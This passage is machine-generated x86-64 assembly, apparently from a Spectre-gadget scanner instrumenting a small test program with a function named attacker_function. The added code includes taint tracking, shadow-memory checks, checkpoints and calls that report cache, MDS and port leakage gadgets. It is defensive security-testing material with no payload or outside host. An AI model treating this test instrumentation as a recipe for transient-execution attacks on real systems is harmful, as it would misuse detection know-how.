.L__attacker_tags_check__teapot___826:

            testb $2,%r12b
            je .L__asan_check__teapot___826

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %r15,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $32,(dift_reg_queued_tag)
            movb $5,(dift_reg_queued_id)
.L__asan_check__teapot___826:

            movq %r15,%r14
            shrq $3,%r14
            movb 2147450880(%r14),%r14b
            testb %r14b,%r14b
            je .L__mem_operand_policy_done__teapot___826
.L__asan_check_fail__teapot___826:

            testb $1,%r12b
            je .L__asan_check_fail_non_attacker__teapot___826
.L__asan_check_fail_attacker__teapot___826:

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %r15,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $16,(dift_reg_queued_tag)
            movb $5,(dift_reg_queued_id)
            jmp .L__mem_operand_policy_done__teapot___826
.L__asan_check_fail_non_attacker__teapot___826:

            orb $2,(dift_reg_queued_tag)
            movb $5,(dift_reg_queued_id)
.L__mem_operand_policy_done__teapot___826:

            nop
            leaq 72(%rsp),%r12
            btcq $45,%r12
            xorl %r14d,%r14d
            orb (dift_reg_tags+6),%r14b
            orb (%r12),%r14b
            movb %r14b,(dift_reg_tags+5)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___827

            movb (dift_reg_queued_tag),%r14b
            movzbq (dift_reg_queued_id),%r15
            orb %r14b,(dift_reg_tags)(%r15)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___827:

            nop
            movq 72(%rsp),%rdi
            leaq -8(%rsp),%r15
            movq (memory_history_top),%r12
            movq (%r15),%r14
            movq %r15,(%r12)
            movq %r14,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            jmp restore_checkpoint_EXT_LIB@PLT

            callq free@PLT
.L__ret_transform_target_attacker_function__0123dae6_c74c_479f_8df9_d4585205bbe3__teapot__:
.L_1b0e__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $22,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            leaq 2152(%rsp),%r15
            xorq %r12,%r12
            orb (dift_reg_tags+6),%r12b
            testb $48,%r12b
            je .L__attacker_tags_check__teapot___831

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %r15,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_CACHE@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__attacker_tags_check__teapot___831:

            testb $2,%r12b
            je .L__asan_check__teapot___831

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %r15,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $32,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__asan_check__teapot___831:

            movq %r15,%r14
            shrq $3,%r14
            movb 2147450880(%r14),%r14b
            testb %r14b,%r14b
            je .L__mem_operand_policy_done__teapot___831
.L__asan_check_fail__teapot___831:

            testb $1,%r12b
            je .L__asan_check_fail_non_attacker__teapot___831
.L__asan_check_fail_attacker__teapot___831:

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %r15,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $16,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
            jmp .L__mem_operand_policy_done__teapot___831
.L__asan_check_fail_non_attacker__teapot___831:

            orb $2,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__mem_operand_policy_done__teapot___831:

            nop
            leaq 2152(%rsp),%r12
            btcq $45,%r12
            xorl %r14d,%r14d
            orb (dift_reg_tags+6),%r14b
            orb (%r12),%r14b
            movb %r14b,(dift_reg_tags)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___832

            movb (dift_reg_queued_tag),%r14b
            movzbq (dift_reg_queued_id),%r15
            orb %r14b,(dift_reg_tags)(%r15)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___832:

            nop
            movq 2152(%rsp),%rax
            xorl %r12d,%r12d
            orb (dift_reg_tags),%r12b
            leaq %fs:40,%r15
            btcq $45,%r15
            orb (%r15),%r12b
            testb $48,%r12b
            je .L__check_ok__teapot___833

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq $0,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_PORT@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__check_ok__teapot___833:

            nop
            leaq %fs:40,%r12
            btcq $45,%r12
            xorl %r14d,%r14d
            orb (dift_reg_tags),%r14b
            orb (%r12),%r14b
            movb %r14b,(dift_reg_tags)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___834

            movb (dift_reg_queued_tag),%r14b
            movzbq (dift_reg_queued_id),%r15
            orb %r14b,(dift_reg_tags)(%r15)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___834:

            nop
            movq (instruction_cnt),%r12
            addq $3,%r12
            cmpq $250,%r12
            jge restore_checkpoint_ROB_LEN@PLT

            movq %r12,(instruction_cnt)
            xorq %fs:40,%rax
            leaq (.__trampoline__3637f681_0bfd_4eb1_9855_07b1a9aa101f__teapot__)(%rip),%r12
            movq %r12,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___836)(%rip),%r12
            movq %r12,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__3637f681_0bfd_4eb1_9855_07b1a9aa101f__teapot__)(%rip),%r12
            movq %r12,(checkpoint_target_metadata+16)
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___836:

            nop
            jne .L_1b33__teapot__
.L__trampoline_target__ef617115_83d6_4203_b3b5_1d386043a2a7__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $34,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            addq $2168,%rsp
            leaq (%rsp),%r12
            btcq $45,%r12
            xorl %r14d,%r14d
            orb (%r12),%r14b
            movb %r14b,(dift_reg_tags+1)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___838

            movb (dift_reg_queued_tag),%r14b
            movzbq (dift_reg_queued_id),%r15
            orb %r14b,(dift_reg_tags)(%r15)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___838:

            nop
            popq %rbx
            leaq (%rsp),%r12
            btcq $45,%r12
            xorl %r14d,%r14d
            orb (%r12),%r14b
            movb %r14b,(dift_reg_tags+7)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___839

            movb (dift_reg_queued_tag),%r14b
            movzbq (dift_reg_queued_id),%r15
            orb %r14b,(dift_reg_tags)(%r15)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___839:

            nop
            popq %rbp
            leaq (%rsp),%r12
            btcq $45,%r12
            xorl %r15d,%r15d
            orb (%r12),%r15b
            movb %r15b,(dift_reg_tags+12)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___840

            movb (dift_reg_queued_tag),%r15b
            movzbq (dift_reg_queued_id),%r13
            orb %r15b,(dift_reg_tags)(%r13)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___840:

            nop
            popq %r12
            leaq (%rsp),%r13
            btcq $45,%r13
            xorl %r14d,%r14d
            orb (%r13),%r14b
            movb %r14b,(dift_reg_tags+13)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___841

            movb (dift_reg_queued_tag),%r14b
            movzbq (dift_reg_queued_id),%r15
            orb %r14b,(dift_reg_tags)(%r15)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___841:

            nop
            popq %r13
            movq %rax,(scratchpad+524288)
            leaq (%rsp),%rax
            btcq $45,%rax
            xorl %r14d,%r14d
            orb (%rax),%r14b
            movb %r14b,(dift_reg_tags+14)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___842

            movb (dift_reg_queued_tag),%r14b
            movzbq (dift_reg_queued_id),%r15
            orb %r14b,(dift_reg_tags)(%r15)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___842:

            nop
            movq (scratchpad+524288),%rax
            popq %r14
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            leaq (%rsp),%rax
            btcq $45,%rax
            xorl %r15d,%r15d
            orb (%rax),%r15b
            movb %r15b,(dift_reg_tags+15)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___843

            movb (dift_reg_queued_tag),%r15b
            movzbq (dift_reg_queued_id),%rbx
            orb %r15b,(dift_reg_tags)(%rbx)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___843:

            nop
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            popq %r15
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rsp,%rbx
            shrq $3,%rbx
            leaq 2147450880(%rbx),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movb $0,(%rbx)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq (instruction_cnt),%rax
            addq $8,%rax
            cmpq $250,%rax
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rax,(instruction_cnt)
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq (%rsp),%rax
            leaq (.__transient_start__teapot__)(%rip),%rbx
            movq %rax,%rcx
            subq %rbx,%rcx
            leaq (.__transient_end__teapot__)(%rip),%rbx
            cmpq %rcx,%rbx
            ja .L__indbr_check_skip__teapot___846

            cmpl $2430306120,(%rax)
            jne restore_checkpoint_MALFORMED_INDIRECT_BR@PLT
.L__indbr_check_skip__teapot___846:

            nop
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            retq 
.L_1b33__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $48,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            leaq -8(%rsp),%rsi
            movq (memory_history_top),%r12
            movq (%rsi),%r11
            movq %rsi,(%r12)
            movq %r11,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            jmp restore_checkpoint_EXT_LIB@PLT

            callq __stack_chk_fail@PLT
.size attacker_function__teapot__, . - attacker_function__teapot__
.L__indbr_transform_target_main__ec6f1844_4465_45c5_87d8_cce69d3ef136__teapot__:
main__teapot__:

            movq %rbx,(scratchpad+524288)
            movq %rsp,%rax
            shrq $3,%rax
            leaq 2147450880(%rax),%rax
            movq (memory_history_top),%rbx
            movq (%rax),%rdi
            movq %rax,(%rbx)
            movq %rdi,8(%rbx)
            leaq 16(%rbx),%rbx
            movq %rbx,(memory_history_top)
            movb $255,(%rax)
            movq (scratchpad+524288),%rbx
            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $84,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            endbr64 
            subq $8,%rsp
            xorl %edi,%edi
            movb %dil,(dift_reg_tags+5)
.L__dift_done__teapot___852:

            nop
            movl $104857600,%edi
            movq %rbx,(scratchpad+524288)
            movq %rcx,(scratchpad+524296)
            leaq -8(%rsp),%rcx
            movq (memory_history_top),%rbx
            movq (%rcx),%rax
            movq %rcx,(%rbx)
            movq %rax,8(%rbx)
            leaq 16(%rbx),%rbx
            movq %rbx,(memory_history_top)
            movq (scratchpad+524296),%rcx
            movq (scratchpad+524288),%rbx
            movq (instruction_cnt),%rax
            addq $4,%rax
            cmpq $250,%rax
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rax,(instruction_cnt)
            callq set_heap_limit__teapot__
.L__ret_transform_target_main__c505e8ff_37cd_493e_8b89_0ea5bd9ef408__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $82,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            movq %rbx,(scratchpad+524288)
            xorl %eax,%eax
            movb %al,(dift_reg_tags)
.L__dift_done__teapot___856:

            nop
            movq (scratchpad+524288),%rbx
            movl $0,%eax
            movq %rbx,(scratchpad+524288)
            movq %rcx,(scratchpad+524296)
            leaq -8(%rsp),%rcx
            movq (memory_history_top),%rbx
            movq (%rcx),%rax
            movq %rcx,(%rbx)
            movq %rax,8(%rbx)
            leaq 16(%rbx),%rbx
            movq %rbx,(memory_history_top)
            movq (scratchpad+524296),%rcx
            movq (scratchpad+524288),%rbx
            movq (instruction_cnt),%rax
            addq $2,%rax
            cmpq $250,%rax
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rax,(instruction_cnt)
            callq attacker_function__teapot__
.L__ret_transform_target_main__85d0b8a9_4353_4380_8c1f_d9bc94ac93b6__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $83,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            movq %rbx,(scratchpad+524288)
            xorl %eax,%eax
            movb %al,(dift_reg_tags)
.L__dift_done__teapot___860:

            nop
            movq (scratchpad+524288),%rbx
            movl $0,%eax
            addq $8,%rsp
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rsp,%rbx
            shrq $3,%rbx
            leaq 2147450880(%rbx),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movb $0,(%rbx)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            jmp restore_checkpoint_EXT_LIB@PLT

            movq %rax,(scratchpad+524288)
            movq (instruction_cnt),%rax
            addq $3,%rax
            cmpq $250,%rax
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rax,(instruction_cnt)
            movq (scratchpad+524288),%rax
            retq 
.L__indbr_transform_target_main__4582e74e_8836_4a6a_909d_d2703c31d825__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $85,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rax,(scratchpad+524304)
            lahf 
            seto %al
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524304),%rax
            movq (instruction_cnt),%rax
            addq $1,%rax
            cmpq $250,%rax
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rax,(instruction_cnt)
            movq %rax,(scratchpad+524304)
            movq (scratchpad+524296),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524304),%rax
            movq (scratchpad+524288),%rax
            nop
            nop
.size main__teapot__, . - main__teapot__
__libc_csu_init__teapot__:

            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rsp,%rbx
            shrq $3,%rbx
            leaq 2147450880(%rbx),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movb $255,(%rbx)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            endbr64 
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rdx,(scratchpad+524312)
            xorl %edx,%edx
            orb (dift_reg_tags+15),%dl
            leaq -8(%rsp),%rbx
            btcq $45,%rbx
            movabsq $72340172838076673,%rcx
            imulq %rcx,%rdx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq %rdx,(%rbx)
            addq $8,%rbx
.L__dift_done__teapot___867:

            nop
            movq (scratchpad+524312),%rdx
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            leaq -8(%rsp),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            pushq %r15
            movq %rax,(scratchpad+524288)
            xorl %r15d,%r15d
            movb %r15b,(dift_reg_tags+15)
.L__dift_done__teapot___869:

            nop
            movq (scratchpad+524288),%rax
            leaq (__frame_dummy_init_array_entry)(%rip),%r15
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rdx,(scratchpad+524312)
            xorl %edx,%edx
            orb (dift_reg_tags+14),%dl
            leaq -8(%rsp),%rbx
            btcq $45,%rbx
            movabsq $72340172838076673,%rcx
            imulq %rcx,%rdx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq %rdx,(%rbx)
            addq $8,%rbx
.L__dift_done__teapot___870:

            nop
            movq (scratchpad+524312),%rdx
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            leaq -8(%rsp),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            pushq %r14
            movq %rax,(scratchpad+524288)
            xorl %r14d,%r14d
            orb (dift_reg_tags+3),%r14b
            movb %r14b,(dift_reg_tags+14)
.L__dift_done__teapot___872:

            nop
            movq (scratchpad+524288),%rax
            movq %rdx,%r14
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rdx,(scratchpad+524312)
            xorl %edx,%edx
            orb (dift_reg_tags+13),%dl
            leaq -8(%rsp),%rbx
            btcq $45,%rbx
            movabsq $72340172838076673,%rcx
            imulq %rcx,%rdx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq %rdx,(%rbx)
            addq $8,%rbx
.L__dift_done__teapot___873:

            nop
            movq (scratchpad+524312),%rdx
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            leaq -8(%rsp),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            pushq %r13
            movq %rax,(scratchpad+524288)
            xorl %r13d,%r13d
            orb (dift_reg_tags+4),%r13b
            movb %r13b,(dift_reg_tags+13)
.L__dift_done__teapot___875:

            nop
            movq (scratchpad+524288),%rax
            movq %rsi,%r13
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rdx,(scratchpad+524312)
            xorl %edx,%edx
            orb (dift_reg_tags+12),%dl
            leaq -8(%rsp),%rbx
            btcq $45,%rbx
            movabsq $72340172838076673,%rcx
            imulq %rcx,%rdx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq %rdx,(%rbx)
            addq $8,%rbx
.L__dift_done__teapot___876:

            nop
            movq (scratchpad+524312),%rdx
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            leaq -8(%rsp),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            pushq %r12
            movq %rax,(scratchpad+524288)
            xorl %r12d,%r12d
            orb (dift_reg_tags+5),%r12b
            movb %r12b,(dift_reg_tags+12)
.L__dift_done__teapot___878:

            nop
            movq (scratchpad+524288),%rax
            movl %edi,%r12d
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rdx,(scratchpad+524312)
            xorl %edx,%edx
            orb (dift_reg_tags+7),%dl
            leaq -8(%rsp),%rbx
            btcq $45,%rbx
            movabsq $72340172838076673,%rcx
            imulq %rcx,%rdx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq %rdx,(%rbx)
            addq $8,%rbx
.L__dift_done__teapot___879:

            nop
            movq (scratchpad+524312),%rdx
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            leaq -8(%rsp),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            pushq %rbp
            movq %rax,(scratchpad+524288)
            xorl %ebp,%ebp
            movb %bpl,(dift_reg_tags+7)
.L__dift_done__teapot___881:

            nop
            movq (scratchpad+524288),%rax
            leaq (__do_global_dtors_aux_fini_array_entry)(%rip),%rbp
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rdx,(scratchpad+524312)
            xorl %edx,%edx
            orb (dift_reg_tags+1),%dl
            leaq -8(%rsp),%rbx
            btcq $45,%rbx
            movabsq $72340172838076673,%rcx
            imulq %rcx,%rdx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq %rdx,(%rbx)
            addq $8,%rbx
.L__dift_done__teapot___882:

            nop
            movq (scratchpad+524312),%rdx
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            leaq -8(%rsp),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            pushq %rbx
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            xorl %ebx,%ebx
            orb (dift_reg_tags+7),%bl
            orb (dift_reg_tags+15),%bl
            movb %bl,(dift_reg_tags+7)
.L__dift_done__teapot___884:

            nop
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            subq %r15,%rbp
            subq $8,%rsp
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            leaq -8(%rsp),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            jmp restore_checkpoint_EXT_LIB@PLT

            callq _init

            movq %rax,(scratchpad+524288)
            xorl %eax,%eax
            orb (dift_reg_tags+7),%al
            testb $48,%al
            je .L__check_ok__teapot___887

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq $0,%rsi
            movq %rax,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_PORT@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__check_ok__teapot___887:

            nop
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq (instruction_cnt),%rax
            addq $2,%rax
            cmpq $250,%rax
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rax,(instruction_cnt)
            movq (scratchpad+524288),%rax
            sarq $3,%rbp
            movq %rax,(scratchpad)
            leaq (.__trampoline__9998af03_97a2_43e5_93e5_3517e89be9d2__teapot__)(%rip),%rax
            movq %rax,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___889)(%rip),%rax
            movq %rax,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__9998af03_97a2_43e5_93e5_3517e89be9d2__teapot__)(%rip),%rax
            movq %rax,(checkpoint_target_metadata+16)
            movq (scratchpad),%rax
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___889:

            nop
            je .L_1bb6__teapot__
.L__trampoline_target__e6061643_58c4_49ce_9ae8_81498d19cbad__teapot__:

            xorl %edx,%edx
            movb %dl,(dift_reg_tags+1)
.L__dift_done__teapot___890:

            nop
            xorl %ebx,%ebx
            movq (instruction_cnt),%rdi
            addq $2,%rdi
            cmpq $250,%rdi
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rdi,(instruction_cnt)
            nop
            nop
            nop
            nop
            nop
            nop
            nop
.L_1ba0__teapot__:

            xorl %edx,%edx
            orb (dift_reg_tags+14),%dl
            movb %dl,(dift_reg_tags+3)
.L__dift_done__teapot___892:

            nop
            movq %r14,%rdx
            xorl %esi,%esi
            orb (dift_reg_tags+13),%sil
            movb %sil,(dift_reg_tags+4)
.L__dift_done__teapot___893:

            nop
            movq %r13,%rsi
            movq %rax,(scratchpad+524288)
            xorl %edi,%edi
            orb (dift_reg_tags+12),%dil
            movb %dil,(dift_reg_tags+5)
.L__dift_done__teapot___894:

            nop
            movq (scratchpad+524288),%rax
            movl %r12d,%edi
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            leaq -8(%rsp),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
